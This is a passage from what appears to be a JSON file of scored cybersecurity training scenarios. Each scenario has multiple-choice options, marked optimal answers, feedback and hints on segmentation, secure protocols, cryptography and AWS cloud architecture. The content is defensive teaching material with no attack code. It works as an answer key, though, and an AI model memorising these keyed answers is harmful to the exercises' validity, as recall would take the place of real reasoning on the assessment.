    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Network Segmentation Benefits",
        "situation": "Valley Medical has a flat network - all devices can communicate with all other devices directly. The IT manager explains this is a problem. A workstation infected with ransomware recently was able to spread to the EHR server.\n\n**Question:** What is the PRIMARY security benefit of network segmentation?",
        "options": [
          {
            "id": "A",
            "text": "Faster network performance",
            "feedback": "{'short': 'Performance is a benefit, but not the primary security reason', 'detailed': 'Segmentation can improve performance by reducing broadcast traffic, but this is an operational benefit. The primary SECURITY benefit is limiting lateral movement - containing breaches to prevent spread.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Limits lateral movement - contains breaches to affected segment",
            "feedback": "{'short': 'Correct! Segmentation contains breaches', 'detailed': 'The primary security benefit is limiting lateral movement. In the scenario, ransomware spread from a workstation to the EHR server because there were no barriers. With segmentation, the workstation segment would be separated from the server segment, requiring the malware to bypass firewall controls to spread.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Makes the network easier to manage",
            "feedback": "{'short': 'Actually, segmentation adds management complexity', 'detailed': 'Segmentation typically increases management complexity - more VLANs, more firewall rules, more configuration. Organizations accept this complexity because the security benefits outweigh the operational overhead.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Eliminates the need for firewalls",
            "feedback": "{'short': 'Incorrect - segmentation requires firewalls to be effective', 'detailed': 'VLANs provide Layer 2 separation, but without firewall rules between segments, traffic can still flow freely via routing. Segmentation and firewalls work together - segmentation creates boundaries, firewalls enforce them.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": []
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Firewall Placement",
        "situation": "The IT manager wants to improve network security by adding firewalls. Currently, there's only a basic router at the internet edge. The clinic has workstations, servers with patient data, and guest WiFi.\n\n**Question:** Where should firewalls be placed for defense in depth?",
        "options": [
          {
            "id": "A",
            "text": "Only at the perimeter between internet and internal network",
            "feedback": "{'short': 'Perimeter-only misses internal threats', 'detailed': \"Perimeter firewall protects against external threats but doesn't help once an attacker is inside (phishing, infected device). Internal threats and lateral movement bypass perimeter controls. Defense in depth requires internal firewalls too.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Perimeter AND between internal segments (servers, workstations, guest)",
            "feedback": "{'short': 'Correct! Multiple firewall layers provide defense in depth', 'detailed': 'Defense in depth requires: perimeter firewall (external threats), internal firewalls between segments (lateral movement), and host firewalls on critical servers (last line). This provides protection at multiple layers - if one fails, others still protect.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Only between servers and workstations - perimeter is the router's job",
            "feedback": "{'short': \"Basic router doesn't provide adequate perimeter protection\", 'detailed': \"Basic routers don't have firewall capabilities - they route traffic but don't inspect or filter it effectively. A proper perimeter firewall with stateful inspection and intrusion prevention is needed. Internal segmentation alone isn't sufficient.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Firewalls aren't needed - just use antivirus on all systems",
            "feedback": "{'short': 'Antivirus and firewalls serve different purposes', 'detailed': \"Antivirus detects malware on endpoints. Firewalls control network traffic. Both are needed - they're different layers of defense. Antivirus might catch ransomware on one system, but firewalls prevent it from spreading to others.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": []
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Secure Protocols",
        "situation": "A vulnerability scan reveals several systems using Telnet for remote management. The IT manager asks you about the risk and what protocol should be used instead.\n\n**Question:** Why is Telnet a security risk and what should replace it?",
        "options": [
          {
            "id": "A",
            "text": "Telnet is slow - use FTP instead for better performance",
            "feedback": "{'short': 'Incorrect - FTP also transmits in cleartext', 'detailed': 'FTP has the same fundamental problem as Telnet - it transmits credentials and data in cleartext. Both are insecure. SSH is the secure replacement for remote access.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Telnet sends credentials in cleartext - use SSH instead",
            "feedback": "{'short': 'Correct! SSH encrypts all traffic including credentials', 'detailed': 'Telnet transmits everything in cleartext - anyone who can capture network traffic can see usernames, passwords, and all commands/output. SSH encrypts the entire session. This is a critical security improvement with no functional downside.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Telnet only works on old systems - use HTTP for modern management",
            "feedback": "{'short': 'HTTP is also cleartext for credentials', 'detailed': 'HTTP (without TLS) transmits in cleartext just like Telnet. For web-based management, HTTPS must be used. For command-line remote access, SSH is the secure choice.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Telnet is fine if you use strong passwords",
            "feedback": "{'short': \"Strong passwords don't help if they're transmitted in cleartext\", 'detailed': 'Password strength is irrelevant if the password is sent across the network in cleartext. An attacker capturing traffic will see the password no matter how strong it is. Encryption (SSH) is the only solution.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": []
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Legacy Protocol Risks",
        "situation": "The vulnerability scan also flags SMBv1 enabled on several servers. The IT manager remembers something about ransomware using SMB vulnerabilities.\n\n**Question:** Why is SMBv1 particularly dangerous beyond cleartext concerns?",
        "options": [
          {
            "id": "A",
            "text": "SMBv1 is too slow for modern networks",
            "feedback": "{'short': \"Performance isn't the security concern\", 'detailed': 'While SMBv1 is slower than newer versions, the critical concern is security vulnerabilities, not performance. SMBv1 has exploitable vulnerabilities that allow remote code execution.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "SMBv1 has wormable vulnerabilities (EternalBlue) enabling ransomware spread",
            "feedback": "{'short': 'Correct! SMBv1 vulnerabilities enabled WannaCry and other attacks', 'detailed': \"SMBv1 has critical vulnerabilities including EternalBlue (MS17-010) that allow remote code execution without authentication. WannaCry and NotPetya ransomware used this to spread across networks automatically. SMBv1 should be disabled - there's no safe way to use it.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "SMBv1 only works on Windows systems",
            "feedback": "{'short': \"Platform support isn't the security issue\", 'detailed': \"SMBv1 works across platforms (Windows, Linux Samba). The security issue is the protocol's vulnerabilities that allow attackers to execute code remotely, not its platform support.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "SMBv1 uses too much bandwidth",
            "feedback": "{'short': \"Bandwidth isn't the security concern\", 'detailed': 'The critical issue with SMBv1 is exploitable vulnerabilities, not bandwidth usage. These vulnerabilities allow attackers to spread malware across networks without any user interaction.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": []
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Defense in Depth Principle",
        "situation": "The clinic administrator asks why they need multiple security controls. 'Can't we just buy one really good firewall?' The IT manager asks you to explain defense in depth.\n\n**Question:** What is the core principle of defense in depth?",
        "options": [
          {
            "id": "A",
            "text": "Buy the most expensive security product available",
            "feedback": "{'short': \"Cost doesn't equal protection\", 'detailed': \"Defense in depth isn't about spending more on a single solution - it's about having multiple layers. An expensive firewall can still be bypassed through phishing. Multiple controls at different layers provide true protection.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Multiple security layers so if one fails, others still protect",
            "feedback": "{'short': 'Correct! No single point of failure', 'detailed': 'Defense in depth assumes any single control can fail (bypassed, misconfigured, zero-day). Multiple layers mean: perimeter firewall might block the attack, but if not, internal segmentation limits spread, and if not, endpoint protection might detect it, and if not, data encryption protects the information. No single point of failure.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Configure security controls to maximum restrictiveness",
            "feedback": "{'short': \"Restrictiveness helps but isn't the core principle\", 'detailed': 'Being restrictive is good practice, but defense in depth is specifically about multiple layers. A maximally restrictive single control is still a single point of failure. The depth (multiple layers) is the key concept.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Focus all security budget on perimeter defense",
            "feedback": "{'short': 'Perimeter-only is the opposite of defense in depth', 'detailed': \"Perimeter-focused security is 'castle and moat' thinking - strong outer wall, nothing inside. Defense in depth distributes controls across perimeter, network, endpoint, application, and data layers. Modern attacks often bypass perimeters (phishing, insider threat).\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": []
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 125,
    "passing_score": 75
  },
  {
    "id": "D3-REM-003",
    "title": "Cryptography Essentials Remediation",
    "domain": 3,
    "type": "REM",
    "difficulty": "foundational",
    "time_estimate": "20-30 minutes",
    "role": "Security Analyst Trainee",
    "organization": {
      "name": "Riverside Credit Union",
      "industry": "Financial Services"
    },
    "introduction": "Riverside Credit Union is conducting security training for IT staff. As a new security analyst trainee, you're participating in the cryptography fundamentals module. Understanding encryption and data protection is essential for protecting member financial information.",
    "learning_objectives": [
      "Compare and contrast concepts and strategies to protect data"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Encryption Type Selection",
        "situation": "Riverside needs to encrypt a large database of member account information at rest. The data is several terabytes and performance is a concern.\n\n**Question:** What type of encryption is best for encrypting a large database at rest?",
        "options": [
          {
            "id": "A",
            "text": "Asymmetric encryption (RSA) for maximum security",
            "feedback": "{'short': 'Asymmetric encryption is too slow for bulk data', 'detailed': 'Asymmetric encryption (RSA, ECC) is hundreds of times slower than symmetric encryption. Using asymmetric for terabytes of data would be impractical - operations would be extremely slow. Asymmetric is used for key exchange, not bulk data encryption.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Symmetric encryption (AES) for performance with large data",
            "feedback": "{'short': 'Correct! AES is designed for bulk data encryption', 'detailed': \"Symmetric encryption (AES-256 is the current standard) is designed for bulk data encryption. It's fast and efficient even for large datasets. The key is protected using key management practices (possibly including asymmetric encryption for key exchange/protection).\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Hashing (SHA-256) to protect the data",
            "feedback": "{'short': \"Hashing doesn't protect data confidentiality\", 'detailed': \"Hashing is one-way - you can't recover the original data from a hash. Hashing a database would destroy the data! Hashing is for integrity verification and password storage, not data protection. Encryption (two-way) is needed for confidentiality.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Combination of both asymmetric and symmetric for every record",
            "feedback": "{'short': 'Hybrid is used, but not per-record', 'detailed': \"Hybrid encryption (asymmetric for key exchange, symmetric for data) is common, but asymmetric isn't applied to every record. Asymmetric protects the symmetric key; symmetric encrypts the data. The combination provides security and performance.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": []
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Password Storage",
        "situation": "Riverside is reviewing how member passwords are stored in their online banking system. Currently, passwords are encrypted using AES and stored in the database.\n\n**Question:** Is encrypting passwords with AES the correct approach?",
        "options": [
          {
            "id": "A",
            "text": "Yes - AES provides strong protection for passwords",
            "feedback": "{'short': \"Encryption allows recovery - passwords shouldn't be recoverable\", 'detailed': 'If passwords are encrypted, they can be decrypted. This means: the encryption key becomes a high-value target, and anyone with the key can access all passwords. Passwords should never be recoverable - even by administrators.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "No - passwords should be hashed, not encrypted",
            "feedback": "{'short': 'Correct! Hashing is one-way - passwords cannot be recovered', 'detailed': 'Passwords should be hashed (with salt) using algorithms like bcrypt, Argon2, or PBKDF2. Hashing is one-way - the original password cannot be recovered. To verify login, hash the entered password and compare hashes. Even if the database is stolen, attackers get hashes, not passwords.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "No - passwords should be stored in plaintext for easier reset",
            "feedback": "{'short': 'Never store passwords in plaintext!', 'detailed': 'Plaintext passwords are the worst option - any breach exposes all credentials immediately. Password resets should generate new passwords, not retrieve old ones. Always hash passwords.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Either hashing or encryption is equally acceptable",
            "feedback": "{'short': 'They serve different purposes - hashing is correct for passwords', 'detailed': 'Encryption and hashing are not interchangeable. Encryption is for data you need to retrieve. Hashing is for data you only need to verify (like passwords). The principle of password storage is: never store recoverable passwords.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": []
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Data States Protection",
        "situation": "A security consultant asks about Riverside's data protection strategy. They want to know if data is protected at rest and in transit.\n\n**Question:** Why must data be protected BOTH at rest AND in transit?",
        "options": [
          {
            "id": "A",
            "text": "Regulatory compliance requires both",
            "feedback": "{'short': 'Compliance is one reason, but not the fundamental reason', 'detailed': 'While regulations often require both, the underlying reason is that data faces different threats in different states. Understanding the threats is more important than just compliance.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Each state faces different threats - storage theft vs. interception",
            "feedback": "{'short': 'Correct! Different states, different threats', 'detailed': 'Data at rest faces threats like storage theft, unauthorized database access, and backup exposure. Data in transit faces interception, man-in-the-middle attacks, and eavesdropping. Encrypting only one leaves the other exposed. Complete protection requires addressing both.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Encrypting one automatically protects the other",
            "feedback": "{'short': 'Incorrect - they require separate controls', 'detailed': \"Encrypting data at rest (disk encryption) doesn't protect data when it's transmitted over a network. Encrypting in transit (TLS) doesn't protect stored data. Each requires separate controls designed for that specific threat.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "It's only necessary for highly sensitive data",
            "feedback": "{'short': 'Good practice applies broadly', 'detailed': 'While prioritization by sensitivity makes sense, protecting data in both states is a fundamental security practice. The ease of implementing TLS and disk encryption means most data should be protected in both states.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": []
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Key Management",
        "situation": "The credit union encrypts backup tapes before sending them to offsite storage. The encryption key is stored in a file on the backup server.\n\n**Question:** What is the BIGGEST problem with this key management approach?",
        "options": [
          {
            "id": "A",
            "text": "The key file might get corrupted",
            "feedback": "{'short': 'Corruption is a concern but not the biggest problem', 'detailed': 'Key backup and protection against corruption is important, but the bigger issue is security. A corrupted key means lost data, but a compromised key means breached data.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Key stored with/near encrypted data - compromise exposes both",
            "feedback": "{'short': 'Correct! Key and data should be separated', 'detailed': 'Storing the encryption key on the backup server means anyone who compromises that server gets both the encrypted backups AND the key to decrypt them. Keys should be stored separately - in a key management system, HSM, or at minimum, a separate secured system. Never store keys with the data they protect.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "The key should be stored in the cloud instead",
            "feedback": "{'short': 'Location matters less than separation', 'detailed': 'Cloud key management (Azure Key Vault, AWS KMS) can be excellent, but the key point is separation from the encrypted data, not cloud vs. on-premises. A cloud key for on-premises backups achieves separation.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Multiple people need access to the key",
            "feedback": "{'short': \"Access control matters but isn't the primary issue here\", 'detailed': 'Key access should be limited, but the fundamental problem is storing the key with the protected data. Even with restricted access, anyone who compromises the backup server gets everything.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": []
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Certificate Understanding",
        "situation": "Riverside's website certificate is expiring. The IT team asks why certificates expire and what happens if they don't renew it.\n\n**Question:** What is the PRIMARY purpose of digital certificates in HTTPS?",
        "options": [
          {
            "id": "A",
            "text": "To encrypt all web traffic",
            "feedback": "{'short': \"Encryption uses the key, but certificate's role is different\", 'detailed': \"The certificate contains a public key used in the encryption process, but the certificate's primary purpose is to PROVE the server's identity. Without identity verification, you might establish an encrypted connection to an attacker.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "To verify the server's identity - prove you're connecting to the real site",
            "feedback": "{'short': 'Correct! Certificates provide identity verification', 'detailed': \"Certificates bind a public key to an identity (the website's domain). A trusted Certificate Authority verifies the domain owner. When you connect to https://riverside-cu.com, the certificate proves you're actually connecting to Riverside Credit Union, not an attacker. Then encryption protects the session.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "To make the website load faster",
            "feedback": "{'short': 'Certificates are for security, not performance', 'detailed': 'HTTPS (with certificates) actually adds a small overhead compared to HTTP. The purpose is security - identity verification and encryption - not performance. Modern protocols (HTTP/2, QUIC) can improve HTTPS performance.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "To comply with PCI-DSS requirements",
            "feedback": "{'short': 'Compliance is a result, not the purpose', 'detailed': \"PCI-DSS requires HTTPS for payment pages (due to the security it provides), but compliance isn't the certificate's purpose. The purpose is security through identity verification and enabling encrypted communications.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": []
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 125,
    "passing_score": 75
  },
  {
    "id": "D3-SIM-001",
    "title": "Cloud Security Architecture",
    "domain": 3,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": "45-60 minutes",
    "role": "Cloud Security Architect",
    "organization": {
      "name": "Meridian Financial Services",
      "industry": "Financial Services"
    },
    "introduction": "Meridian Financial Services is executing an ambitious cloud migration strategy. As the newly hired Cloud Security Architect, you're responsible for designing the security architecture that will protect critical financial data across a multi-cloud environment. The CISO has emphasized that security cannot be an afterthought - it must be built into the architecture from day one. Your first week involves critical decisions that will shape the security posture for years to come.",
    "learning_objectives": [
      "Compare and contrast security implications of different architecture models",
      "Given a scenario, apply security principles to secure enterprise infrastructure"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Service Model Selection for Customer Portal",
        "situation": "Your first task is migrating the customer-facing portal to AWS. The portal is a .NET application currently running on Windows servers. The development team wants to modernize but also needs to move quickly. You need to recommend the appropriate cloud service model.\n\n**Question:** Which cloud service model should you recommend for the customer portal migration?",
        "options": [
          {
            "id": "A",
            "text": "IaaS (EC2 instances) - lift and shift the existing application",
            "feedback": "{'short': \"Works but doesn't leverage cloud benefits\", 'detailed': \"Lift-and-shift to EC2 is possible and low-risk, but you inherit all OS patching, scaling, and management overhead. For a customer-facing portal requiring 99.9% availability, you'd need to build auto-scaling, load balancing, and high availability yourself. This approach moves to cloud without benefiting from cloud-native features.\", 'consequence': 'Migration completes but operational burden remains high. Team spends time on infrastructure instead of application improvement.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "PaaS (Elastic Beanstalk or App Service) - platform handles infrastructure",
            "feedback": "{'short': 'Correct! PaaS reduces operational burden while maintaining control', 'detailed': 'PaaS is ideal for web applications like the customer portal. AWS Elastic Beanstalk handles capacity provisioning, load balancing, auto-scaling, and health monitoring. You maintain control over the application code while AWS manages the platform. This reduces your security responsibility (no OS patching) while meeting the 99.9% availability requirement more easily.', 'consequence': 'Successful migration with reduced operational overhead. Security team can focus on application security rather than infrastructure.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "SaaS - find a third-party customer portal solution",
            "feedback": "{'short': \"SaaS isn't appropriate for custom applications\", 'detailed': \"The customer portal is a custom .NET application with proprietary business logic and integrations. SaaS solutions are pre-built applications - you can't deploy your custom code to a SaaS platform. SaaS is for adopting existing applications, not hosting your own.\", 'consequence': \"This approach isn't technically feasible for the custom application.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Serverless (Lambda) - maximum cloud-native benefits",
            "feedback": "{'short': 'Serverless requires significant refactoring for existing applications', 'detailed': \"While serverless offers compelling benefits (no server management, pay-per-use), migrating an existing .NET application to Lambda requires significant refactoring into functions. This conflicts with the need to 'move quickly.' Serverless is better for new development or applications designed for event-driven architecture.\", 'consequence': 'Extended timeline and development effort for refactoring. Risk of project delays.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Consider the balance between migration speed and operational benefits. Which model handles infrastructure while accepting your existing application?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "PaaS services like Elastic Beanstalk accept application code and handle scaling, patching, and availability automatically."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "AWS Account Strategy",
        "situation": "The existing single AWS account is inadequate for production workloads. You need to design an account strategy that provides security isolation, supports compliance requirements, and scales with the organization.\n\n**Question:** What AWS account strategy should you implement?",
        "options": [
          {
            "id": "A",
            "text": "Keep single account but improve IAM policies and tagging",
            "feedback": "{'short': \"Single account doesn't provide adequate isolation\", 'detailed': \"A single account creates significant risks: no blast radius containment (one compromised workload affects all), complex IAM (everyone's policies in one place), compliance difficulties (PCI scope includes everything), and cost allocation challenges. For regulated financial services, this approach is inadequate.\", 'consequence': 'Auditors flag account structure as a control weakness. IAM complexity leads to privilege creep.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Environment-based accounts (Dev, Test, Staging, Production)",
            "feedback": "{'short': \"Better but doesn't provide workload isolation\", 'detailed': 'Environment separation is an improvement - production is isolated from dev/test. However, all production workloads share one account, meaning a vulnerability in one application could affect others. For financial services with multiple sensitive applications, workload-level isolation is preferable.', 'consequence': 'Improved but PCI assessor questions why all production workloads share an account.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Multi-account with workload isolation (Organizations, SCPs, dedicated security account)",
            "feedback": "{'short': 'Correct! Maximum isolation and control for regulated workloads', 'detailed': 'Multi-account strategy with AWS Organizations provides: blast radius isolation (issues contained to one account), granular IAM (simpler policies per account), compliance boundaries (PCI workloads in dedicated accounts), cost allocation, and centralized governance via SCPs. The dedicated security account enables centralized logging, GuardDuty, and Security Hub management.', 'consequence': 'Strong foundation for secure, compliant cloud operations. Auditors appreciate clear isolation boundaries.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Separate AWS accounts per team without central governance",
            "feedback": "{'short': 'Decentralized accounts create governance gaps', 'detailed': 'Account sprawl without Organizations creates chaos: no consistent security controls, no centralized logging, inconsistent compliance posture, billing complexity. Each team could have different (or no) security configurations. Central governance through Organizations and SCPs is essential.', 'consequence': 'Shadow IT in the cloud. Security team has no visibility across accounts.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Consider: How do you isolate workloads while maintaining central governance and visibility?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "AWS Organizations with SCPs provides governance. Separate accounts per workload provide isolation. A security account enables centralized monitoring."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Identity and Access Architecture",
        "situation": "The organization has 2,500 employees using on-premises Active Directory. Cloud resources need identity management that integrates with existing systems, supports MFA, and provides SSO across AWS and SaaS applications.\n\n**Question:** What identity architecture should you implement?",
        "options": [
          {
            "id": "A",
            "text": "Create IAM users in each AWS account for cloud access",
            "feedback": "{'short': \"IAM users don't scale and create management overhead\", 'detailed': 'Creating IAM users means: managing credentials in multiple places (AD + AWS), no SSO (users need separate AWS credentials), complex offboarding (must remove from AD AND each AWS account), and no leverage of existing AD groups. This approach is only suitable for service accounts or break-glass access.', 'consequence': 'Identity sprawl, inconsistent access revocation, users sharing credentials due to friction.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "AWS IAM Identity Center (SSO) with native directory",
            "feedback": "{'short': 'Creates duplicate identity management', 'detailed': \"Using IAM Identity Center with its own directory means managing two separate identity stores (AD + Identity Center). Users must be provisioned in both systems. This creates sync issues, doesn't leverage existing AD investment, and doubles identity management workload.\", 'consequence': 'Two identity systems to manage. Access inconsistencies between on-prem and cloud.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Federate with Azure AD (synced from on-prem AD) using SAML",
            "feedback": "{'short': 'Correct! Single identity source with cloud-native capabilities', 'detailed': 'Azure AD synced with on-prem AD provides: single identity source (manage in AD, sync to cloud), SSO across AWS and SaaS (Azure AD as identity hub), built-in MFA and Conditional Access, mature enterprise features, and clean integration path for Microsoft 365 and other SaaS. AWS IAM Identity Center can federate from Azure AD for AWS access.', 'consequence': 'Unified identity management. Users get SSO experience. Security team has centralized access control and MFA.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Direct AD FS federation to each AWS account",
            "feedback": "{'short': 'Works but adds complexity and on-prem dependency', 'detailed': \"AD FS federation directly to AWS works but: requires maintaining AD FS infrastructure (high availability, patching), creates tight dependency on on-premises systems, and doesn't provide the rich SaaS integration that Azure AD offers. For a multi-cloud strategy including SaaS, Azure AD is more flexible.\", 'consequence': 'Functional but increased infrastructure management and limited SaaS integration.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What approach provides single identity source, SSO across cloud and SaaS, and built-in MFA?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Azure AD synced with on-prem AD becomes the cloud identity hub. AWS and SaaS apps federate from Azure AD."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Network Connectivity Architecture",
        "situation": "Production workloads require secure, reliable connectivity between on-premises data centers and AWS. The core banking system will remain on-premises, requiring low-latency communication with cloud workloads.\n\n**Question:** What network connectivity architecture should you implement?",
        "options": [
          {
            "id": "A",
            "text": "Site-to-site VPN as the primary connection",
            "feedback": "{'short': 'VPN has bandwidth and latency limitations for production', 'detailed': \"Site-to-site VPN traverses the internet, resulting in variable latency and limited bandwidth (~1.25 Gbps per tunnel). For financial services requiring low-latency communication with core banking systems, VPN doesn't provide the performance consistency needed. VPN is appropriate for backup connectivity or dev/test.\", 'consequence': 'Performance issues during high-traffic periods. Occasional latency spikes affect user experience.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "AWS Direct Connect as primary, VPN as backup",
            "feedback": "{'short': 'Correct! Dedicated connection with redundant backup', 'detailed': \"Direct Connect provides dedicated, private connectivity with consistent low latency and high bandwidth (up to 100 Gbps). Combined with VPN as backup, you get: production-grade performance for core banking integration, private connectivity (doesn't traverse internet), and automatic failover if Direct Connect fails. This hybrid approach balances performance, cost, and reliability.\", 'consequence': 'Consistent, high-performance connectivity. Automatic failover provides resilience. Clean network path for compliance.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "All traffic over public internet with TLS encryption",
            "feedback": "{'short': \"Internet connectivity doesn't meet financial services requirements\", 'detailed': 'Public internet connectivity, even encrypted, is unsuitable for sensitive financial data: highly variable latency, potential compliance concerns with data traversing public networks, bandwidth limitations, and no SLA. This approach is inappropriate for production financial workloads.', 'consequence': 'Performance unpredictability. Potential compliance violations. No SLA for connectivity.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Dual Direct Connect connections without VPN backup",
            "feedback": "{'short': 'Dual Direct Connect is ideal but expensive without flexibility', 'detailed': 'Dual Direct Connect provides maximum performance and redundancy, but: higher cost (two dedicated connections), longer provisioning time for the second connection, and no diversity if both connections terminate in the same facility. VPN backup provides different-path redundancy at lower cost.', 'consequence': 'Higher cost without significantly better resilience than Direct Connect + VPN.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Financial services need consistent, low-latency connectivity. What provides dedicated bandwidth while maintaining backup options?"
          },
          {
            "level": 2,
            "cost": 5,
